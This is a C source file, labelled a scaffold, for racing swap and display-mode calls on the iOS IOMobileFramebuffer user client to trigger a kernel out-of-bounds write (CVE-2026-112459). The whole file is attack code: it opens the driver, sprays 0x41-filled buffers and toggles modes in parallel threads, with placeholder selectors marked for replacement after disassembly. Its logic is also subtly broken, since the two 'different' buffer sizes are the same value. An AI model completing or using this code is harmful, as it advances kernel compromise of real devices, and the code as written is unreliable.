/*
 * mbfb_race_scaffold.c — SCAFFOLD, not an exploit.
 *
 * Target : CVE-2026-112459 (com.apple.iokit.IOMobileGraphicsFamily)
 * Theory : swap and set_display_mode are not serialized, so a swap can use
 *          buffer dimensions from before a concurrent mode change, writing
 *          the frame past the buffer (kernel OOB write).
 * Status : the user-client selectors and the exact mode-set API are NOT
 *          known from the workspace diffs. The scaffold drives the public
 *          display API and is intended to be swapped to the private user
 *          client once the selectors are recovered.
 *
 * Build  : xcrun -sdk iphoneos clang -arch arm64 -framework IOKit \
 *              -framework CoreFoundation mbfb_race_scaffold.c -o mbfb_race
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdatomic.h>
#include <pthread.h>
#include <unistd.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

/* REPLACE AFTER DISASSEMBLY. */
#define MBFB_SERVICE_NAME       "IOMobileFramebuffer"
#define MBFB_SELECTOR_SWAP      0   /* buffer flip / present            */
#define MBFB_SELECTOR_SETMODE   0   /* display mode / refresh change    */

static io_connect_t g_conn = 0;
static atomic_int   g_stop = 0;

/* Frame buffers: one large enough for the largest mode. */
static void *g_back  = NULL;
static void *g_front = NULL;
static size_t g_big   = 0;
static size_t g_small = 0;

/* Thread A: swap using the large-mode dimensions. */
static void *swap_thread(void *arg) {
    (void)arg;
    while (!atomic_load(&g_stop)) {
        uint64_t in[4] = { 0, 1, g_big, 0 };   /* handle, count, len */
        uint64_t out[2] = { 0, 0 };
        uint32_t out_cnt = 2;
        /* Fill the back buffer with a pattern so an overrun is visible. */
        memset(g_back, 0x41, g_big);
        IOConnectCallScalarMethod(g_conn, MBFB_SELECTOR_SWAP,
                                  in, 4, out, &out_cnt);
    }
    return NULL;
}

/* Thread B: change display mode between two sizes to force reallocation. */
static void *mode_thread(void *arg) {
    (void)arg;
    int toggle = 0;
    while (!atomic_load(&g_stop)) {
        size_t len = toggle ? g_small : g_big;
        uint64_t in[4] = { 0, (uint64_t)toggle, (uint64_t)len, 0 };
        uint64_t out[2] = { 0, 0 };
        uint32_t out_cnt = 2;
        IOConnectCallScalarMethod(g_conn, MBFB_SELECTOR_SETMODE,
                                  in, 4, out, &out_cnt);
        toggle ^= 1;
        usleep(200);   /* tiny, to interleave with swap */
    }
    return NULL;
}

int main(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                            IOServiceMatching(MBFB_SERVICE_NAME));
    if (!svc) { fprintf(stderr, "[-] %s not found\n", MBFB_SERVICE_NAME); return 1; }
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] IOServiceOpen: 0x%x\n", kr); return 1;
    }

    /* Two mode sizes; replace with real dimensions once known. */
    g_big   = 1170 * 2532 * 4;   /* e.g. one orientation */
    g_small = 2532 * 1170 * 4;   /* the other orientation */
    if (g_small > g_big) { size_t t = g_big; g_big = g_small; g_small = t; }

    g_back  = malloc(g_big);
    g_front = malloc(g_big);
    if (!g_back || !g_front) return 1;

    pthread_t a, b;
    pthread_create(&a, NULL, swap_thread, NULL);
    pthread_create(&b, NULL, mode_thread, NULL);
    sleep(30);
    atomic_store(&g_stop, 1);
    pthread_join(a, NULL);
    pthread_join(b, NULL);

    printf("[*] no fault; adjust selectors/modes or widen contention\n");
    IOServiceClose(g_conn);
    return 0;
}
